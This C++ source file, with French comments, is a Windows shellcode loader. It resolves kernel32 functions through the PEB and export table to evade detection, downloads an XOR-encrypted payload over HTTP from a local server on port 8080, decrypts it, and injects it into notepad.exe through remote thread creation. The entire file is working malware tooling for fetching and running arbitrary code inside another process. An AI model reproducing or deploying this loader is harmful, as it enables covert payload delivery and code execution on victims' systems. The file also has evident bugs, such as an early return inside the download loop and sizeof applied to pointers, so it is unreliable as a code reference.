#include <iostream>
#pragma once
#include <Windows.h>
#include <winhttp.h>
#include <TlHelp32.h>
#pragma comment(lib, "winhttp.lib")

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* GetCurrentProcess_t)();

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    ULONG Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InInitOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InInitializationOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    PVOID EntryPoint;
    PVOID Reserved3;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

PVOID GetModuleBaseAddress(const wchar_t* targetDllName) {
    // Get the PEB address
    PPEB pPeb = (PPEB)__readgsqword(0x60);

    // Access the PEB_LDR_DATA structure
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Traverse the list of loaded DLLs
    while (pDte != (PLDR_DATA_TABLE_ENTRY)&pLdr->InMemoryOrderModuleList) {
        // Compare the DLL name (case-insensitive)
        if (_wcsicmp(pDte->BaseDllName.Buffer, targetDllName) == 0) {
            return pDte->DllBase; // Return the base address if found
        }

        // Move to the next DLL
        pDte = *(PLDR_DATA_TABLE_ENTRY*)pDte;
    }

    return NULL; // DLL not found
}

struct ChargeDLL {
    HMODULE hKernel;

    VirtualAlloc_t pVirtualAlloc;
    WriteProcessMemory_t pWriteProcessMemory;
    VirtualProtect_t pVirtualProtect;
    CreateThread_t pCreateThread;
    VirtualFree_t pVirtualFree;
    GetCurrentProcess_t pGetCurrentProcess;
};

PVOID GetProcAddressFromExportTable(PBYTE pPeBuffer, const char* functionName) {
    // Cast the DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPeBuffer;

    // Validate the DOS header
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        //printf("Invalid DOS Header signature.\n");
        return NULL;
    }

    // Get the NT headers
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPeBuffer + pImgDosHdr->e_lfanew);

    // Validate the NT headers
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        //printf("Invalid NT Headers signature.\n");
        return NULL;
    }

    // Get the Optional Headers
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // Get the Export Data Directory
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPeBuffer +
        ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get arrays for function names, addresses, and ordinals
    PDWORD FunctionNameArray = (PDWORD)(pPeBuffer + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pPeBuffer + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pPeBuffer + pImgExportDir->AddressOfNameOrdinals);

    // Search for the function
    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        // Get the function name
        CHAR* pFunctionName = (CHAR*)(pPeBuffer + FunctionNameArray[i]);

        // Compare with the target function name
        if (strcmp(pFunctionName, functionName) == 0) {
            // Get the ordinal for this function
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];

            // Get the function address
            DWORD FunctionRVA = FunctionAddressArray[wFunctionOrdinal];
            return (PVOID)(pPeBuffer + FunctionRVA);
        }
    }

    // Function not found
    //printf("Function %s not found in export table.\n", functionName);
    return NULL;
}

int chargerLib(ChargeDLL* chargeDLL) {

    // Charger la DLL
    //HMODULE hUser32 = LoadLibraryA("kernel32.dll");
    //if (hUser32 == NULL) return 0;

    chargeDLL->hKernel = (HMODULE)GetModuleBaseAddress(L"C:\\Windows\\System32\\KERNEL32.dll");
    if (chargeDLL->hKernel == NULL) return 0;

    // Use the new GetProcAddressFromExportTable function
    chargeDLL->pVirtualAlloc = (VirtualAlloc_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualAlloc");
    if (chargeDLL->pVirtualAlloc == NULL) return 0;

    chargeDLL->pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "WriteProcessMemory");
    if (chargeDLL->pWriteProcessMemory == NULL) return 0;

    chargeDLL->pVirtualProtect = (VirtualProtect_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualProtect");
    if (chargeDLL->pVirtualProtect == NULL) return 0;

    chargeDLL->pCreateThread = (CreateThread_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "CreateThread");
    if (chargeDLL->pCreateThread == NULL) return 0;

    chargeDLL->pVirtualFree = (VirtualFree_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "VirtualFree");
    if (chargeDLL->pVirtualFree == NULL) return 0;

    chargeDLL->pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddressFromExportTable((PBYTE)chargeDLL->hKernel, "GetCurrentProcess");
    if (chargeDLL->pGetCurrentProcess == NULL) return 0;

    return 1; // Success
}

void FreeLib(ChargeDLL* chargeDLL) {

    // Libérer la DLL
    FreeLibrary(chargeDLL->hKernel);

}

DWORD GetProcessIdByName(const wchar_t* processName) {
    // Take a snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create process snapshot. Error: " << GetLastError() << "\n";
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process in the snapshot
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Compare the process name
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                // Found the process, return its PID
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32)); // Iterate through the remaining processes
    }

    // Cleanup
    CloseHandle(hSnapshot);

    std::cout << "Process not found: " << processName << "\n";
    return 0; // Process not found
}

BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        //printf("Échec. Code d'erreur: %lu\n", GetLastError());
        return FALSE;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteMemory == NULL) {
        //printf("Erreur VirtualAllocEx: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMemory, payload, payloadSize, &bytesWritten)) {
        //printf("Erreur WriteProcessMemory: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Change memory permissions to PAGE_EXECUTE_READ
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "VirtualProtectEx failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        //printf("Erreur CreateRemoteThread: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    //VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    //CloseHandle(hThread);
    //CloseHandle(hProcess);

    return TRUE;
}

HINTERNET Open() {
    return WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
}

HINTERNET Connect(HINTERNET hSession, const wchar_t host[], int port) {
    return WinHttpConnect(hSession, host, port, 0);
}

HINTERNET OpenRequest(HINTERNET hConnect, const wchar_t path[]) {
    return WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
}

BOOL SendRequest(HINTERNET hRequest) {
    return WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
}

LPSTR CheckData(HINTERNET hRequest) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    do {
        dwSize = 0;

        // Check for available data
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            std::cout << "Error " << GetLastError() << " in WinHttpQueryDataAvailable.\n";
            break;
        }

        // Allocate space for the buffer
        //pszOutBuffer = new char[dwSize + 1];
        char* pszOutBuffer = (char*)LocalAlloc(LPTR, dwSize + 1);
        if (!pszOutBuffer) {
            std::cout << "Out of memory\n";
            dwSize = 0;
        }
        else {
            // Read the data
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                dwSize, &dwDownloaded)) {
                std::cout << "Error " << GetLastError() << " in WinHttpReadData.\n";
            }
            else {
                //std::cout << pszOutBuffer;
            }
            return pszOutBuffer;
            // Free the memory allocated to the buffer
            LocalFree(pszOutBuffer);
            //delete[] pszOutBuffer;
        }
    } while (dwSize > 0);
}

int main()
{
    ChargeDLL chargeDLL = { 0 };
    if (chargerLib(&chargeDLL) == 0) return 0;
    if (chargeDLL.pVirtualAlloc == NULL) return 0;
    if (chargeDLL.pWriteProcessMemory == NULL) return 0;
    if (chargeDLL.pVirtualProtect == NULL) return 0;
    if (chargeDLL.pCreateThread == NULL) return 0;
    if (chargeDLL.pVirtualFree == NULL) return 0;

    const SIZE_T sPayloadSize = 433;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL bResults = FALSE;
    SIZE_T keySize = 3;

    // Initialize WinHTTP
    hSession = Open();

    if (hSession)
        hConnect = Connect(hSession, L"127.0.0.1", 8080);

    if (hConnect)
        hRequest = OpenRequest(hConnect, L"/");

    // Send a request
    if (hRequest)
        bResults = SendRequest(hRequest);

    // Receive the response
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left
    LPSTR shell = CheckData(hRequest);

    // Manually assign the first three bytes to the key
    unsigned char key[3];

    // Assign the first three bytes to the key
    key[0] = (unsigned char)shell[0];
    key[1] = (unsigned char)shell[1];
    key[2] = (unsigned char)shell[2];

    // Point to the remaining payload
    LPSTR encryptedPayload = shell + 3;

    // Output or process the key and payload
    //printf("Key: %02x %02x %02x\n", key[0], key[1], key[2]);
    
    // Output the full payload in bytes
    //printf("Payload (Bytes): ");
    //for (size_t i = 0; i < (sPayloadSize); ++i) { // Subtracting 3 to exclude the key size
    //    printf("%02x", (unsigned char)encryptedPayload[i]);
    //}
    //printf("\n");

    // Close handles
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    //if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";

    //const size_t SHELLCODE_SIZE = sPayloadSize;

    UCHAR decryptedPayload[sPayloadSize] = {};

    for (size_t i = 0; i < sPayloadSize; ++i) {
        decryptedPayload[i] = encryptedPayload[i] ^ key[i % keySize];
        //printf("/%x", decryptedPayload[i]);
    };

    // Resolve the PID dynamically for a process 
    DWORD pid = GetProcessIdByName(L"notepad.exe");

    if (pid == 0) {
        std::cout << "Target process not found.\n";
        return 1; // Exit if process is not found
    }

    InjectShellcode(decryptedPayload, sPayloadSize, pid);

    SecureZeroMemory(shell, sizeof(shell));

    SecureZeroMemory(encryptedPayload, sizeof(encryptedPayload));

    SecureZeroMemory(decryptedPayload, sizeof(decryptedPayload));

    Sleep(5000);

    // Libérer les DLL
    FreeLib(&chargeDLL);

}
